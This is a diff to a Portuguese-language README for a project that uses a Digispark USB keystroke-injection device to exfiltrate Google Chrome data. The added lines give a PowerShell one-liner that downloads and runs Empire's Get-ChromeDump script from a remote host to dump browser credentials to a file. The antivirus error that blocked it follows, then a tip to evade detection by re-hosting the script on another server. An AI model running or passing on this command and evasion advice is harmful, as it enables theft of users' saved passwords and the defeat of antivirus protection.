@@ -1,4 +1,25 @@
-# Esse projeto parece não estar mais funcionando devido a correções no chrome e uso do Empire
+# Esse projeto parece não estar mais funcionando devido ao antivirus
+PS C:\WINDOWS\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFile 'C:\l\ChromeDump.txt'
+IEX : No linha:1 caractere:1
++ Function Get-ChromeDump{
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+Este script contém conteúdo mal-intencionado e foi bloqueado pelo software antivírus.
+No linha:1 caractere:1
++ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+Get-ChromeDump : O termo 'Get-ChromeDump' não é reconhecido como nome de cmdlet, função, arquivo de script ou programa
+operável. Verifique a grafia do nome ou, se um caminho tiver sido incluído, veja se o caminho está correto e tente
+novamente.
+No linha:1 caractere:162
++ ... module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFil ...
++                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ChromeDump:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+    
+# tente baixar o arquivo Get-ChromeDump.ps1 e upar em outro servidor, depois aponte para o servidor onde ele foi upado
 
 
 # Usando o digispark para exfiltrar dados do google chrome
